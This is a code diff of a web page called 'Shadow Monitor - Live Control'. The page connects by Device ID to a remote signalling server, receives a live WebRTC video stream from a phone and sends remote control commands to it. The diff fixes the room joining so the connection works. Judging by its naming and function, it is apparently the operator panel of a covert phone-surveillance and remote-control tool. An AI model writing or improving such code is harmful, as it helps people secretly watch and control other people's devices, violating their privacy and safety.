@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shadow Monitor - Live View</title>
+    <title>Shadow Monitor - Live Control</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
@@ -11,7 +11,6 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
 
     <style>
-        /* --- CSS START --- */
         :root {
             --phone-bg: #000;
             --bezel: #1a1a1a;
@@ -34,7 +33,7 @@
             overflow: hidden;
         }
 
-        /* PHONE FRAME */
+        /* --- PHONE FRAME DESIGN --- */
         .phone-frame {
             width: 320px;
             height: 680px;
@@ -69,7 +68,7 @@
             flex-direction: column;
         }
 
-        /* VIDEO PLAYER */
+        /* --- VIDEO PLAYER --- */
         video {
             width: 100%;
             height: 100%;
@@ -77,7 +76,7 @@
             background: black;
         }
 
-        /* LOGIN OVERLAY */
+        /* --- LOGIN OVERLAY --- */
         .overlay {
             position: absolute;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -107,7 +106,7 @@
         }
         button.connect-btn:hover { transform: scale(1.05); }
 
-        /* NAVIGATION BAR */
+        /* --- NAVIGATION BAR --- */
         .nav-bar {
             position: absolute;
             bottom: 10px;
@@ -130,7 +129,7 @@
         }
         .nav-btn:active { color: white; transform: scale(0.9); }
 
-        /* EXTERNAL CONTROLS */
+        /* --- EXTERNAL CONTROLS --- */
         .external-controls {
             margin-top: 20px;
             display: flex;
@@ -154,7 +153,7 @@
         .tool-btn:hover { background: #333; color: var(--accent); }
         .tool-btn:active { transform: scale(0.9); }
 
-        /* STATUS BADGE */
+        /* --- STATUS BADGE --- */
         .status-badge {
             position: absolute;
             top: 20px;
@@ -166,7 +165,7 @@
         }
         .status-badge.live { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
         .status-badge.error { color: #ff4444; }
-        /* --- CSS END --- */
+
     </style>
 </head>
 <body>
@@ -201,7 +200,6 @@
     </div>
 
     <script>
-        // --- JAVASCRIPT LOGIC START ---
         const SOCKET_URL = "https://child-v9no.onrender.com"; 
         
         let socket;
@@ -212,7 +210,7 @@
         const overlayEl = document.getElementById("connectOverlay");
         const videoEl = document.getElementById("remoteVideo");
 
-        // URL Parameter Check
+        // URL se ID uthana
         const urlParams = new URLSearchParams(window.location.search);
         if(urlParams.get('id')) document.getElementById("deviceId").value = urlParams.get('id');
 
@@ -220,7 +218,7 @@
             const deviceId = document.getElementById("deviceId").value;
             if(!deviceId) return alert("Please enter Device ID");
 
-            // Reset Socket
+            // Purana socket disconnect karo taaki conflict na ho
             if(socket) {
                 socket.disconnect();
                 socket = null;
@@ -232,27 +230,26 @@
             socket.on("connect", () => {
                 console.log("✅ Socket Connected");
                 statusEl.innerText = "Waiting for Phone...";
-                socket.emit("join-room", "VIEWER"); 
+                
+                // IMPORTANT: Phone aur Browser SAME ROOM mein hone chahiye
+                socket.emit("join-room", deviceId); 
             });
 
-            // HANDLE OFFER (The main connection part)
+            // Jab Phone se Signal aaye
             socket.on("offer", async (data) => {
-                if (data.target !== deviceId && data.target !== "VIEWER") return;
-
                 console.log("📡 Offer Received");
                 statusEl.innerText = "Connecting Video...";
                 statusEl.className = "status-badge live";
 
-                // Clean old connection
                 if (peerConnection) {
                     peerConnection.close();
                     peerConnection = null;
                 }
                 
-                // Create new connection
                 createPeerConnection(deviceId);
 
                 try {
+                    // Signal ko sahi format mein convert karna
                     let offerDesc = data.offer;
                     if (typeof offerDesc === 'string') offerDesc = JSON.parse(offerDesc);
                     
@@ -261,9 +258,10 @@
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
 
+                    // Answer wapas Phone ko bhejo
                     socket.emit("answer", { target: deviceId, answer: answer });
                     
-                    // Hide overlay only when connection logic runs
+                    // Connection banne par Login Screen hatao
                     overlayEl.style.display = "none";
                 } catch (err) {
                     console.error("Handshake Error:", err);
@@ -286,13 +284,14 @@
             socket.on("disconnect", () => {
                 statusEl.innerText = "Disconnected";
                 statusEl.className = "status-badge error";
-                overlayEl.style.display = "flex";
+                overlayEl.style.display = "flex"; // Show Login Again
             });
         }
 
         function createPeerConnection(targetId) {
             peerConnection = new RTCPeerConnection(config);
 
+            // Stream aate hi Video dikhao
             peerConnection.ontrack = (event) => {
                 console.log("🎥 Video Stream Started");
                 videoEl.srcObject = event.streams[0];
@@ -308,12 +307,12 @@
         function sendCmd(action) {
             const deviceId = document.getElementById("deviceId").value;
             if(socket && socket.connected) {
+                // Command bhejo
                 socket.emit("control-event", { room: deviceId, action: action });
             } else {
                 alert("Connect first!");
             }
         }
-        // --- JAVASCRIPT LOGIC END ---
     </script>
 
 </body>
